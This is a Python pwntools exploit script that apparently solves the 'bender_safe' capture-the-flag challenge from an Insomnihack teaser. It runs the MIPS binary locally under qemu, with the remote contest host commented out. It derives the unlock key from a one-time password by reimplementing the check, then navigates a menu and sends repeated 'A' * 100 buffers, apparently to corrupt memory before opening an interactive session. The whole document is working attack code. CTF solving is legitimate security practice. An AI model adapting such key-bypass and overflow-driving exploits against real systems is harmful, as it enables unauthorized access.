#!/usr/bin/python
from pwn import *
import sys

DEBUG = True
#p = remote("bender_safe.teaser.insomnihack.ch", 31337)
p = process(['./challenge/qemu-mips', './challenge/bender_safe'])

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

# Step 1

def solve(OTP):
  key = ""
  mychar = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
  key += OTP[0]
  key += OTP[15]
  if ord(OTP[7]) < ord('A'):
    key += chr(ord(OTP[7]) ^ 64)
  else:
    key += chr(ord(OTP[7]) ^ 0x4B ^ 0x61 ^ 0xA)

  if ord(OTP[3]) >= ord('A'):
    key += mychar[mychar.find(OTP[3]) + 10]
  else :
    key += mychar[mychar.find(OTP[3]) - 10]

  if ord(OTP[4]) >= ord('A'):
    key += mychar[mychar.find(OTP[4]) + 10]
  else :
    key += mychar[mychar.find(OTP[4]) - 10]

  leng = len(mychar)

  key += mychar[(abs(ord(OTP[1]) - ord(OTP[2]))) % 35]
  key += mychar[(abs(ord(OTP[5]) - ord(OTP[6]))) % 35]

  if ord(OTP[8]) >= ord('A'):
    key += chr(ord(OTP[8]) ^ 0x4B ^ 0x61 ^ 0xA)
  else:
    key += chr(ord(OTP[8]) ^ 64)

  return key

r("OTP")
r("\n")
OTP = r("\n")[:-1]

p.sendline(solve(OTP))

# Step 2

r('Exit')
r('--\n')

p.sendline('2')

r('store?')
p.sendline('13')

# p.sendline('')

for i in xrange(10):
  p.sendline('lol')

for i in xrange(3):
  p.send('A' * 100)

p.sendline('\n4')

p.interactive()
p.close()
